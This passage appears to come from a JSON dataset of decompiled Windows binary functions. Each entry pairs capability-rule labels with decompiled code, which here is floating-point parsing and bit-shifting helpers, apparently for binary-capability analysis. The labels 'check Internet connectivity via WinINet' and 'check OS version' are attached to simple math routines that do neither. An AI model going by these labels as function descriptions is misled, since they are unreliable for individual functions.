(uStack36 & 1) == 0; uStack36._0_4_ = uStack36 >> 1 | 0x80000000) {\n                        iVar21 = iVar21 + 1;\n                    }\n                    iVar21 = 0x35 - iVar21;\n                }\n                bVar33 = *(iVar7 * 4 + 0x527660) + iVar21 < 0x36;\n                uStack36 = uStack36 * *(iVar7 * 8 + 0x527920);\n                goto code_r0x0043eb36;\n            }\n            if (iVar7 <= 0x25 - uVar29) {\n                uStack36 = uStack36 * *((0xf - uVar29) * 8 + 0x527920) * *((iVar7 - (0xf - uVar29)) * 8 + 0x527920);\n                goto code_r0x0043fb74;\n            }\n        }\ncode_r0x0043ec14:\n        uVar19 = (uVar29 - uVar19) + iVar21;\n        if (uVar19 < 1) {\n            uVar31 = uVar19;\n            if (uVar19 != 0) {\n                uVar19 = -uVar19;\n                if ((uVar19 & 0xf) != 0) {\n                    uStack36 = uStack36 / *((uVar19 & 0xf) * 8 + 0x527920);\n                }\n                uVar31 = uVar19 & 0xfffffff0;\n                if (uVar31 != 0) {\n                    uVar19 = uVar19 >> 4;\n                    if (uVar19 < 0x10) {\n                        iVar21 = 0;\n                    }\n                    else {\n                        uVar31 = uVar19 - 0x10;\n                        iVar21 = 0;\n                        do {\n                            uVar19 = uVar19 - 0x10;\n                            uStack36 = uStack36 & 0x800fffffffffffff | 0x3ff0000000000000;\n                            iVar21 = iVar21 + -0x3ff + (uStack36._4_4_ >> 0x14 & 0x7ff);\n                            uStack36 = uStack36 * *0x527a00;\n                        } while ((uVar31 & 0xf) != uVar19);\n                        uVar19 = uVar31 & 0xf;\n                    }\n                    uStack36 = uStack36 & 0x800fffffffffffff | 0x3ff0000000000000;\n                    uVar31 = iVar21 + -0x3ff + (uStack36._4_4_ >> 0x14 & 0x7ff);\n                    if (0 < uVar19) {\n                        bVar33 = false;\n                        iVar21 = 0;\n                        dVar3 = uStack36;\n                        do {\n                            if ((uVar19 & 1) != 0) {\n                                dVar3 = dVar3 * *(iVar21 * 8 + 0x5279e0);\n                                bVar33 = true;\n                            }\n                            iVar21 = iVar21 + 1;\n                            uVar19 = uVar19 >> 1;\n                        } while (uVar19 != 0);\n                        goto code_r0x0043eee7;\n                    }\n                }\n            }\n        }\n        else {\n            if ((uVar19 & 0xf) != 0) {\n                uStack36 = uStack36 * *((uVar19 & 0xf) * 8 + 0x527920);\n            }\n            uVar31 = uVar19 & 0xfffffff0;\n            if ((uVar19 & 0xfffffff0) != 0) {\n                uVar19 = uVar19 >> 4;\n                if (uVar19 < 0x10) {\n                    iVar21 = 0;\n                }\n                else {\n                    uVar31 = uVar19 - 0x10;\n                    iVar21 = 0;\n                    do {\n                        uVar19 = uVar19 - 0x10;\n                        uStack36 = uStack36 & 0x800fffffffffffff | 0x3ff0000000000000;\n                        iVar21 = iVar21 + -0x3ff + (uStack36._4_4_ >> 0x14 & 0x7ff);\n                        uStack36 = uStack36 * *0x527a40;\n                    } while ((uVar31 & 0xf) != uVar19);\n                    uVar19 = uVar31 & 0xf;\n                }\n                uStack36 = uStack36 & 0x800fffffffffffff | 0x3ff0000000000000;\n                uVar31 = iVar21 + -0x3ff + (uStack36._4_4_ >> 0x14 & 0x7ff);\n                if (uVar19 != 0) {\n                    bVar33 = false;\n                    iVar21 = 0;\n                    dVar3 = uStack36;\n                    do {\n                        if ((uVar19 & 1) != 0) {\n                            dVar3 = dVar3 * *(iVar21 * 8 + 0x527a20);\n                            bVar33 = true;\n                        }\n                        iVar21 = iVar21 + 1;\n                        uVar19 = uVar19 >> 1;\n                    } while (uVar19 != 0);\ncode_r0x0043eee7:\n                    if (bVar33) {\n                        uStack36 = dVar3;\n                    }\n                }\n            }\n        }\n        iStack40 = fcn.004468d0(uStack36, &uStack48, &uStack52);\n        uStack48 = uVar31 + uStack48;\n        iVar21 = uStack52 - uVar34;\n        if (0 < iVar21) {\n            fcn.004458b0(iStack40, iVar21);\n            uStack48 = iVar21 + uStack48;\n            uStack52 = uVar34;\n        }\n        uStack100 = (uStack52 + uStack48) - uVar34;\n        uStack116 = uVar16;\n        if (param_3[2] + 1 < uStack100) {\n            uStack180 = 0;\n            goto code_r0x0043f0e8;\n        }\n        uVar19 = param_3[1];\n        if (uVar19 <= uStack100) {\n            uStack180 = 0;\n            goto code_r0x0043f183;\n        }\n        iVar21 = uStack48 - uVar19;\n        if (iVar21 < 1) {\n            if (iVar21 == 0) goto code_r0x0043ed0e;\n            uStack52 = uStack52 + iVar21;\n            if (0 < uStack52) {\n                fcn.004458b0(iStack40, -iVar21);\n                goto code_r0x0043ed0e;\n            }\n            if (-2 < uStack52) {\n                uStack52 = 1;\n                *(iStack40 + 0x10) = 1;\n                *(iStack40 + 0x14) = 1;\n                goto code_r0x0043ed0e;\n            }\n            *(iStack40 + 0x10) = 0;\n            *(iStack40 + 0x14) = 0;\n            *param_4 = uVar19;\n            if (uVar16 != 0) goto code_r0x0043ed55;\n            uStack56 = 0x50;\n            goto code_r0x0043e9e0;\n        }\n        iStack40 = fcn.00446480(iStack40, iVar21);\n        uStack52 = uStack52 + iVar21;\ncode_r0x0043ed0e:\n        if ((uVar16 == 0) || (uVar19 <= uStack100 + 1)) {\n            uStack180 = 1;\n            uStack100 = uVar19;\n            uStack48 = uVar19;\ncode_r0x0043f183:\n            iVar10 = fcn.00446a00(puStack188, uVar26, uVar29, uStack164, uVar6);\n            uStack184 = 0;\n            iVar21 = -iVar7;\n            iVar11 = 0;\n            if (-1 < iVar7) {\n                iVar21 = 0;\n                iVar11 = iVar7;\n            }\n            do {\n                puStack188 = fcn.00445f30(*(iVar10 + 4), uVar26);\n                iVar12 = iVar10 + 0xc;\n                sub.msvcrt.dll_memcpy(puStack188 + 0xc, iVar10 + 0xc, *(iVar10 + 0x10) * 4 + 8);\n                iVar12 = fcn.00445f30(*(iStack40 + 4), iVar12);\n                iVar13 = iStack40 + 0xc;\n                sub.msvcrt.dll_memcpy(iVar12 + 0xc, iVar13, *(iStack40 + 0x10) * 4 + 8);\n                uVar29 = uStack52 - uStack184;\n                iVar14 = uStack184 + uStack48;\n                uStack204 = fcn.00446160(1, iVar13);\n                if (iVar14 < 0) {\n                    iVar13 = iVar11 - iVar14;\n                    iVar30 = iVar21;\n                }\n                else {\n                    iVar13 = iVar11;\n                    iVar30 = iVar21 + iVar14;\n                }\n                iVar27 = (iVar14 + uVar29) - uVar34;\n                iVar14 = (uVar34 + 1) - uVar29;\n                if (iVar27 < uVar19) {\n                    iVar14 = (iVar27 - uVar19) + iVar14;\n                }\n                iVar27 = iVar30 + iVar14;\n                iVar13 = iVar13 + iVar14;\n                iVar14 = iVar13;\n                if (iVar27 <= iVar13) {\n                    iVar14 = iVar27;\n                }\n                if (iVar30 <= iVar14) {\n                    iVar14 = iVar30;\n                }\n                if (0 < iVar14) {\n                    iVar27 = iVar27 - iVar14;\n                    iVar13 = iVar13 - iVar14;\n                    iVar30 = iVar30 - iVar14;\n                }\n                iVar14 = iVar12;\n                if (iVar21 != 0) {\n                    uStack204 = fcn.00446300(uStack204, iVar21);\n                    iVar35 = iVar12;\n                    iVar14 = fcn.00446190(uStack204, iVar12);\n                    fcn.00446000(iVar12, iVar35);\n                }\n                iVar27 = iVar27 - uStack184;\n                if (iVar27 < 1) {\n                    if (iVar27 != 0) {\n                        fcn.004458b0(iVar14, -iVar27);\n                    }\n                }\n                else {\n                    iVar14 = fcn.00446480(iVar14, iVar27);\n                }\n                if (0 < iVar7) {\n                    puStack188 = fcn.00446300(puStack188, iVar11);\n                }\n                if (0 < iVar13) {\n                    puStack188 = fcn.00446480(puStack188, iVar13);\n                }\n                if (0 < iVar30) {\n                    uStack204 = fcn.00446480(uStack204, iVar30);\n                }\n                uVar26 = puStack188;\n                iVar12 = fcn.004465f0(iVar14, puStack188);\n                if ((*(iVar12 + 0x10) < 2) && (*(iVar12 + 0x14) == 0)) goto code_r0x0043f7b4;\n                uVar31 = *(iVar12 + 0xc);\n                *(iVar12 + 0xc) = 0;\n                uVar26 = uStack204;\n                iVar13 = fcn.004465a0(iVar12, uStack204);\n                if ((uStack128 == 0) || (0 < iVar13)) {\n                    if (iVar13 < 0) {\n                        if (uVar31 != 0) goto code_r0x0043ffa8;\n                        uStack56 = 0x21;\n                        if (((1 < uVar29) || (uStack100 == uVar19)) || (uStack180 != 0)) goto code_r0x0043f7b4;\n                        iVar12 = fcn.00446480(iVar12, 1);\n                        uVar26 = uStack204;\n                        iVar7 = fcn.004465a0(iVar12, uStack204);\n                        if (iVar7 < 1) goto code_r0x0043fad0;\n                        uStack56 = 0x11;\n                        uStack180 = 0;\n                    }\n                    else {\n                        if (iVar13 != 0) {\n                            uVar26 = uStack204;\n                            fVar32 = fcn.00446ae0(iVar12, uStack204);\n                            if (fVar32 <= *0x5276c0) {\n                                if (uVar31 == 0) {\n                                    uStack184 = 0;\n                                    goto code_r0x0043f63e;\n                                }\n                                iStack156 = 0;\n                                uStack104 = 0x20;\n                                uStack184 = 0;\n                                uStack160 = 0;\n                                dStack172 = 1.0;\n                                dStack148 = 1.0;\n                                goto code_r0x0043f51b;\n                            }\n                            uStack104 = (-(uVar31 == 0) & 0x10) + 0x10;\n                            fVar32 = fVar32 * *0x5276c4;\n                            uStack160 = uVar31 == 0;\n                            dStack172 = fVar32;\n                            if (*0x5276c8 <= fVar32) {\n                                iStack156 = 0;\n                                dStack148 = dStack172;\n                            }\n                            else {\n                                iStack156 = ROUND(fVar32);\n                                dStack172 = iStack156;\n                                dStack148 = fVar32 - iStack156;\n                                if (uStack128 == 1) {\n                                    if (uStack160 != 0) {\ncode_r0x0043f965:\n                                        if (0.0 < dStack148) {\ncode_r0x0043f971:\n                                            iStack156 = iStack156 + 1;\n                                            uStack104 = 0x30 - uStack104;\n                                            dStack172 = iStack156;\n                                        }\n                                    }\n                                }\n                                else if (uStack128 == 2) {\n                                    if (uStack160 == 0) goto code_r0x0043f965;\n                                }\n                                else if (*0x5276c4 <= fVar32 - iStack156) goto code_r0x0043f971;\n                            }\n                            uStack184 = 0;\n                            goto code_r0x0043f51b;\n                        }\n                        if (uVar31 != 0) {\n                            if (uStack180 == 0) goto code_r0x0043ffb8;\n                            puVar23 = iStack40 + 0x14;\n                            puVar1 = puVar23 + (uStack52 >> 5);\n                            if (puVar1 <= puVar23) goto code_r0x0043fd81;\n                            uVar16 = *(iStack40 + 0x14);\n                            puVar23 = iStack40 + 0x18;\n                            goto joined_r0x0043fd61;\n                        }\n                        if (uVar29 != 1) {\n                            uStack56 = 0x21;\n                            goto code_r0x0043ff4b;\n                        }\n                        uStack56 = 1;\n                        if (uStack100 == uVar19) {\n                            uStack56 = 0x21;\n                            if ((*(iStack40 + 0x10) == 1) && (uStack116 = uVar29,  *(iStack40 + 0x14) != 1)) {\n                                uStack116 = uVar16;\n                            }\n                            goto code_r0x0043f7b4;\n                        }\n                    }\n                    uStack48 = uStack48 - uVar34;\n                    uStack52 = uVar34;\n                    uVar26 = uVar34;\n                    iStack40 = fcn.0043e470(iStack40, uVar34);\n                    goto code_r0x0043f7b4;\n                }\n                uVar15 = uStack128 & 1;\n                uStack184 = uVar15 ^ uVar31;\n                if (uVar15 == uVar31) {\n                    uStack56 = (-(uVar15 == 0) & 0x10) + 0x11;\n                    goto code_r0x0043f7b4;\n                }\n                if (uVar31 == 0) {\n                    uStack56 = 0x11;\n                    if (uStack100 != uVar19) {\n                        uVar15 = uVar34;\n                        if (uVar34 < 0x20) {\ncode_r0x0043f765:\n                            if (1 < uVar15) {\n                                puVar23 = iStack40 + 0x14 + uVar31 * 4;\n                                iVar13 = 0;\n                                uVar31 = *puVar23;\n                                for (uVar22 = uVar31; (uVar22 & 1) == 0; uVar22 = uVar22 >> 1 | 0x80000000) {\n                                    iVar13 = iVar13 + 1;\n                                }\n                                *puVar23 = uVar31 >> (iVar13 & 0x1f);\n                                if (iVar13 < uVar15 - 1) goto code_r0x0043f63e;\n                            }\n                            uStack48 = uStack100 - 1;\n                            uStack52 = uVar34;\n                            uVar26 = uVar34;\n                            iStack40 = fcn.0043e470(iStack40, uVar34);\n                            goto code_r0x0043f7b4;\n                        }\n                        iVar13 = *(iStack40 + 0x14);\n                        uVar22 = uVar34;\n                        while (iVar13 == 0) {\n                            uVar22 = uVar22 - 0x20;\n                            uVar31 = uVar31 + 1;\n                            uVar15 = uVar34 & 0x1f;\n                            if ((uVar34 & 0x1f) == uVar22) goto code_r0x0043f765;\n                            iVar13 = *(iStack40 + 0x14 + uVar31 * 4);\n                        }\n                    }\ncode_r0x0043f63e:\n                    if ((uVar29 < 2) && (uStack180 != 0)) {\n                        uStack180 = 1;\n                        goto code_r0x0043fed1;\n                    }\n                    iStack156 = 0;\n                    uStack104 = 0x10;\n                    uStack160 = 1;\n                    dStack172 = 1.0;\n                    dStack148 = 1.0;\n                }\n                else {\n                    uStack56 = 0x21;\n                    iStack156 = 0;\n                    uStack104 = 0x20;\n                    uStack160 = 0;\n                    dStack172 = 1.0;\n                    dStack148 = 1.0;\n                }\ncode_r0x0043f51b:\n                iVar13 = uStack48 + uStack52;\n                if ((uStack52 < uVar34) && (uStack180 == 0)) {\n                    iVar30 = uVar34 - uStack52;\n                    iStack40 = fcn.00446480(iStack40, iVar30);\n                    uStack48 = uStack48 - iVar30;\n                    uStack52 = uVar34;\n                }\n                uVar26 = fcn.004468d0(dStack172, &iStack64, auStack60);\n                if (iStack64 < 0) {\n                    fcn.004458b0();\n                }\n                else if (iStack64 != 0) {\n                    uVar26 = fcn.00446480();\n                }\n                iVar30 = iStack40;\n                if (uStack160 == 0) {\n                    iStack40 = fcn.00440070();\n                    iVar27 = *(iStack40 + 0x10) + -1;\n                    if (*(iVar30 + 0x10) != iVar27 && iVar27 <= *(iVar30 + 0x10)) {\n                        iVar27 = *(iStack40 + 0x10) + 3;\n                        puVar23 = iStack40 + 4 + iVar27 * 4;\n                        uVar29 = 0x1f;\n                        if (*puVar23 != 0) {\n                            for (; *puVar23 >> uVar29 == 0; uVar29 = uVar29 - 1) {\n                            }\n                        }\n                        puVar23 = iVar30 + 4 + iVar27 * 4;\n                        uVar31 = 0x1f;\n                        if (*puVar23 != 0) {\n                            for (; *puVar23 >> uVar31 == 0; uVar31 = uVar31 - 1) {\n                            }\n                        }\n                        if ((uVar31 ^ 0x1f) <= (uVar29 ^ 0x1f)) goto code_r0x0043f250;\n                    }\n                    if (uStack180 == 0) {\n                        uVar26 = 1;\n                        fcn.004458b0();\n                        uStack48 = uStack48 + 1;\n                        uStack100 = uStack100 + 1;\n                        iStack156 = 0;\n                    }\n                    else {\n                        uStack52 = uStack52 + 1;\n                        uStack180 = uStack52 != uVar34;\n                    }\ncode_r0x0043f250:\n                    fcn.00446000();\n                    fcn.00446000();\n                    if (uStack184 != 0) goto code_r0x0043f7b4;\n                    if ((uStack52 + uStack48 == iVar13) && (iStack156 != 0)) {\n                        dStack172 = dStack172 * *0x5276d0;\n                        if (-dStack172 <= dStack148 - *0x5276c4) {\n                            if ((dStack172 < dStack148 - *0x5276c4) && (dStack148 < *0x5276bc - dStack172))\n                            goto code_r0x0043f9c0;\n                        }\n                        else if (dStack172 < dStack148) goto code_r0x0043f9c0;\n                    }\n                    if (uStack180 == 0) goto code_r0x0043f6d9;\n                }\n                else {\n                    iStack40 = fcn.004465f0();\n                    if (uStack180 != 0) goto code_r0x0043f250;\n                    iVar27 = *(iVar30 + 0x10) + -1;\n                    if (*(iStack40 + 0x10) != iVar27 && iVar27 <= *(iStack40 + 0x10)) {\n                        iVar27 = *(iVar30 + 0x10) + 3;\n                        puVar23 = iStack40 + 4 + iVar27 * 4;\n                        uVar29 = 0x1f;\n                        if (*puVar23 != 0) {\n                            for (; *puVar23 >> uVar29 == 0; uVar29 = uVar29 - 1) {\n                            }\n                        }\n                        puVar23 = iVar30 + 4 + iVar27 * 4;\n                        uVar31 = 0x1f;\n                        if (*puVar23 != 0) {\n                            for (; *puVar23 >> uVar31 == 0; uVar31 = uVar31 - 1) {\n                            }\n                        }\n                        if ((uVar29 ^ 0x1f) <= (uVar31 ^ 0x1f)) goto code_r0x0043f250;\n                    }\n                    if (uStack100 == uVar19) {\n                        uStack52 = uStack52 - 1;\n                        uStack180 = uStack160;\n                        goto code_r0x0043f250;\n                    }\n                    uVar26 = 1;\n                    iStack40 = fcn.00446480();\n                    uStack48 = uStack48 - 1;\n                    uStack100 = uStack100 - 1;\n                    fcn.00446000();\n                    fcn.00446000();\ncode_r0x0043f6d9:\n                    uStack184 = fcn.004459c0();\n                    uStack180 = 0;\n                }\n                fcn.00446000();\n                fcn.00446000();\n                fcn.00446000();\n                fcn.00446000();\n            } while( true );\n        }\n        *(iStack40 + 0x10) = 0;\n        *(iStack40 + 0x14) = 0;\n        *param_4 = uVar19;\n        uStack48 = uVar19;\n        goto code_r0x0043ed55;\n    }\n    if ((puStack44[1] == 0x58) || (puStack44[1] == 0x78)) {\n        uStack56 = fcn.00444ea0(&puStack44, param_3, param_4, &iStack40, iStack140);\n        if (uStack56 == 6) {\n            puStack44 = param_1;\n            if (param_2 != NULL) {\n                *param_2 = param_1;\n            }\n            goto code_r0x0043e97c;\n        }\n    }\n    else {\n        do {\n            puStack44 = puStack44 + 1;\n            uVar20 = *puStack44;\n        } while (uVar20 == 0x30);\n        if (uVar20 != 0) {\n            uStack180 = 1;\n            goto code_r0x0043e5cf;\n        }\n    }\n    goto code_r0x0043e951;\ncode_r0x0043e650:\n    puStack44 = puStack44 + 1;\n    uVar20 = *puStack44;\n    if (0x2d < uVar20) goto code_r0x0043e670;\n    goto code_r0x0043e553;\njoined_r0x0043fd61:\n    if (uVar16 != 0xffffffff) goto code_r0x0043ffb8;\n    if (puVar1 <= puVar23) goto code_r0x0043fd81;\n    uVar16 = *puVar23;\n    puVar23 = puVar23 + 1;\n    goto joined_r0x0043fd61;\ncode_r0x0043f9c0:\n    uStack56 = uStack56 | uStack104;\ncode_r0x0043f7b4:\n    if (uStack180 == 0) {\ncode_r0x0043fad0:\n        uStack180 = uStack52;\n        goto code_r0x0043fadb;\n    }\n    goto code_r0x0043f7c7;\ncode_r0x0043fd81:\n    if (((uStack52 & 0x1f) != 0) && ((-1 << (uStack52 & 0x1f) | *puVar23) != 0xffffffff)) {\ncode_r0x0043ffb8:\n        uStack56 = 0x11;\ncode_r0x0043ff4b:\n        if ((uVar34 <= uVar29) || (uStack180 != 0)) {\n            if ((*(iStack40 + 0x14) & 1) != 0) {\n                if (uVar31 == 0) {\n                    if (uVar29 == 1) {\ncode_r0x0043fed1:\n                        *(iStack40 + 0x10) = 0;\n                        uStack56 = 0x50;\n                        uStack48 = uVar19;\n                    }\n                    else {\n                        iVar7 = *(iStack40 + 0x10);\n                        piVar25 = iStack40 + 0x14;\n                        do {\n                            if (*piVar25 != 0) {\n                                *piVar25 = *piVar25 + -1;\n                                break;\n                            }\n                            piVar24 = piVar25 + 1;\n                            *piVar25 = -1;\n                            piVar25 = piVar24;\n                        } while (piVar24 < iStack40 + 0x14 + iVar7);\ncode_r0x0043ffa8:\n                        uStack56 = 0x11;\n                    }\n                }\n                else {\n                    iStack40 = fcn.0043dfb0(iStack40, uVar26);\n                    puVar23 = iStack40 + 0x10 + *(iStack40 + 0x10) * 4;\n                    uVar16 = 0x1f;\n                    if (*puVar23 != 0) {\n                        for (; *puVar23 >> uVar16 == 0; uVar16 = uVar16 - 1) {\n                        }\n                    }\n                    if ((-uStack52 & 0x1f) != (uVar16 ^ 0x1f)) {\n                        uStack52 = uStack52 + 1;\n                    }\n                    uStack56 = 0x21;\n                }\n            }\n            goto code_r0x0043f7b4;\n        }\n        goto code_r0x0043fad0;\n    }\n    *(iStack40 + 0x10) = 1;\n    *(iStack40 + 0x14) = 1;\n    uStack52 = 1;\n    uStack56 = 0x21;\n    uStack48 = (uVar34 - 1) + uVar19;\ncode_r0x0043fadb:\n    uStack180 = uVar34 - uStack180;\n    if (uStack180 != 0) {\n        if (uStack180 < 1) {\n            uVar26 = -uStack180;\n            fcn.004458b0(iStack40, uVar26);\n        }\n        else {\n            uVar26 = uStack180;\n            iStack40 = fcn.00446480(iStack40, uStack180);\n        }\n        uStack48 = uStack48 - uStack180;\n        uStack180 = 0;\n    }\ncode_r0x0043f7c7:\n    *param_4 = uStack48;\n    fcn.00446000(iVar14, uVar26);\n    fcn.00446000(puStack188, uVar26);\n    fcn.00446000(uStack204, uVar26);\n    fcn.00446000(iVar10, uVar26);\n    fcn.00446000(iVar12, uVar26);\n    if (param_3[2] < uStack48) {\n        uVar16 = param_3[3] & 3;\n        if (uVar16 == 2) {\n            if (iStack140 == 0) goto code_r0x0043f0e8;\n        }\n        else if (uVar16 == 3) {\n            if (iStack140 != 0) goto code_r0x0043f0e8;\n        }\n        else if (uVar16 == 1) {\ncode_r0x0043f0e8:\n            uStack56 = 0xa3;\n            *(iStack40 + 0x10) = 0;\n            puVar9 = sub.msvcrt.dll__errno();\n            *puVar9 = 0x22;\n            *param_4 = param_3[2] + 1;\n            goto code_r0x0043f122;\n        }\n        fcn.00446000(iStack40, uVar26);\n        iStack40 = 0;\n        uStack56 = 0x11;\n        *param_4 = param_3[2];\n        uVar16 = *param_3;\n        puVar9 = param_5 + (uVar16 + 0x1f >> 5);\n        puVar17 = param_5;\n        if (param_5 < puVar9) {\n            do {\n                puVar18 = puVar17 + 1;\n                *puVar17 = 0xffffffff;\n                puVar17 = puVar18;\n            } while (puVar18 < puVar9);\n        }\n        uVar16 = uVar16 & 0x1f;\n        if (uVar16 != 0) {\n            puVar9[-1] = puVar9[-1] >> (0x20U - uVar16 & 0x1f);\n        }\n    }\ncode_r0x0043f122:\n    if (uStack180 != 0) {\n        if (uStack116 == 0) {\n            uVar16 = uStack56 & 0x30;\n            uStack56 = uStack56 & 0xfffffff8;\n            if (0 < *(iStack40 + 0x10)) {\n                uStack56 = uStack56 | 2;\n            }\n            if (uVar16 != 0) {\ncode_r0x0043e9e0:\n                uStack56 = uStack56 | 0x40;\n                puVar9 = sub.msvcrt.dll__errno();\n                *puVar9 = 0x22;\n            }\n        }\n        else {\ncode_r0x0043ed55:\n            *(iStack40 + 0x10) = 0;\n            uStack56 = 0x50;\n            puVar9 = sub.msvcrt.dll__errno();\n            *puVar9 = 0x22;\n        }\n    }\ncode_r0x0043e951:\n    if (param_2 != NULL) {\n        *param_2 = puStack44;\n    }\n    if (iStack140 != 0) {\n        uStack56 = uStack56 | 8;\n    }\ncode_r0x0043e97c:\n    if (iStack40 != 0) {\n        fcn.00446bf0(param_5, uVar34, iStack40);\n        fcn.00446000(iStack40, uVar34);\n    }\n    return uStack56;\n}\n",
        "token_count": 10996
    },
    "00440260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00440260(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    ushort *puVar1;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    ushort *puVar2;\n    \n    if (-1 < param_2) {\n        if (0xf < param_2) {\n            uVar3 = param_2 - 0x10;\n            puVar1 = in_EAX + 4;\n            do {\n                do {\n                    puVar2 = puVar1 + 1;\n                    *puVar1 = *puVar2;\n                    puVar1 = puVar2;\n                } while (puVar2 != in_EAX + 0x10);\n                param_2 = param_2 - 0x10;\n                *(in_EAX + 0x10) = 0;\n                puVar1 = in_EAX + 4;\n            } while (param_2 != (uVar3 & 0xf));\n            param_2 = uVar3 & 0xf;\n        }\n        if (7 < param_2) {\n            puVar8 = in_EAX + 0x10;\n            uVar7 = 0;\n            do {\n                uVar5 = *puVar8;\n                puVar9 = puVar8 + -1;\n                *puVar8 = uVar5 << 8 | uVar7;\n                puVar8 = puVar9;\n                uVar7 = uVar5 >> 8;\n            } while (in_EAX + 2 != puVar9);\n            param_2 = param_2 & 7;\n        }\n        for (; param_2 != 0; param_2 = param_2 - 1) {\n            uVar3 = 0;\n            puVar8 = in_EAX + 0x10;\n            do {\n                if (*puVar8 < 0) {\n                    uVar3 = uVar3 | 1;\n                }\n                uVar7 = *puVar8 * 2;\n                if ((uVar3 & 2) != 0) {\n                    uVar7 = uVar7 | 1;\n                }\n                puVar9 = puVar8 + -1;\n                uVar3 = uVar3 * 2;\n                *puVar8 = uVar7;\n                puVar8 = puVar9;\n            } while (puVar9 != in_EAX + 2);\n        }\n        return false;\n    }\n    uVar3 = -param_2;\n    if (param_2 < -0xf) {\n        uVar7 = 0;\n        do {\n            uVar7 = uVar7 | *(in_EAX + 0x10);\n            iVar6 = 6;\n            do {\n                *(in_EAX + 4 + iVar6 * 2) = *(in_EAX + 2 + iVar6 * 2);\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            uVar3 = uVar3 - 0x10;\n            *(in_EAX + 4) = 0;\n        } while (0xf < uVar3);\n    }\n    else {\n        uVar7 = 0;\n    }\n    if (7 < uVar3) {\n        uVar7 = uVar7 | *(in_EAX + 0x10);\n        puVar8 = in_EAX + 4;\n        iVar6 = 0;\n        do {\n            uVar5 = *puVar8;\n            puVar9 = puVar8 + 1;\n            *puVar8 = uVar5 >> 8 | iVar6;\n            puVar8 = puVar9;\n            iVar6 = uVar5 << 8;\n        } while (puVar9 != in_EAX + 0x12);\n        uVar3 = uVar3 & 7;\n    }\n    if (uVar3 != 0) {\n        do {\n            uVar4 = 0;\n            uVar7 = uVar7 | *(in_EAX + 0x10) & 1;\n            puVar8 = in_EAX + 4;\n            do {\n                if ((*puVar8 & 1) != 0) {\n                    uVar4 = uVar4 | 1;\n                }\n                uVar5 = *puVar8 >> 1;\n                if ((uVar4 & 2) != 0) {\n                    uVar5 = uVar5 | 0x8000;\n                }\n                puVar9 = puVar8 + 1;\n                uVar4 = uVar4 * 2;\n                *puVar8 = uVar5;\n                puVar8 = puVar9;\n            } while (in_EAX + 0x12 != puVar9);\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    return uVar7 != 0;\n}\n",
        "token_count": 1116
    },
    "004408e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004408e0(int16_t *param_1, uint *param_2)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int16_t *piVar3;\n    uint16_t uVar5;\n    int16_t *piVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    int16_t *piVar4;\n    \n    uVar5 = param_1[1];\n    piVar3 = param_1 + 3;\n    if ((uVar5 & 0x7fff) == 0x7fff) {\n        iVar1 = *piVar3;\n        while( true ) {\n            if (iVar1 != 0) {\n                *param_2 = 0;\n                param_2[1] = 0xc0000000;\n                param_2[2] = 0x7fff;\n                return;\n            }\n            piVar3 = piVar3 + 1;\n            if (param_1 + 9 == piVar3) break;\n            iVar1 = *piVar3;\n        }\n    }\n    else if (uVar5 == 0) {\n        puVar7 = param_1 + 2;\n        do {\n            if ((*puVar7 & 1) != 0) {\n                uVar5 = uVar5 | 1;\n            }\n            uVar2 = *puVar7 >> 1;\n            if ((uVar5 & 2) != 0) {\n                uVar2 = uVar2 | 0x8000;\n            }\n            puVar8 = puVar7 + 1;\n            uVar5 = uVar5 * 2;\n            *puVar7 = uVar2;\n            puVar7 = puVar8;\n        } while (param_1 + 9 != puVar8);\n    }\n    *(param_2 + 10) = 0;\n    if (*param_1 == 0) {\n        *(param_2 + 2) = param_1[1];\n        uVar5 = param_1[1];\n    }\n    else {\n        *(param_2 + 2) = param_1[1] | 0x8000;\n        uVar5 = param_1[1];\n    }\n    if ((uVar5 & 0x7fff) == 0x7fff) {\n        piVar3 = param_1 + 3;\n        while (*piVar3 == 0) {\n            piVar3 = piVar3 + 1;\n            if (piVar3 == param_1 + 9) {\n                *param_2 = 0;\n                param_2[1] = 0x80000000;\n                return;\n            }\n        }\n    }\n    piVar3 = param_1 + 3;\n    piVar6 = param_2 + 6;\n    do {\n        piVar4 = piVar3 + 1;\n        *piVar6 = *piVar3;\n        piVar3 = piVar4;\n        piVar6 = piVar6 + -1;\n    } while (param_1 + 7 != piVar4);\n    return;\n}\n",
        "token_count": 693
    },
    "00440d00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
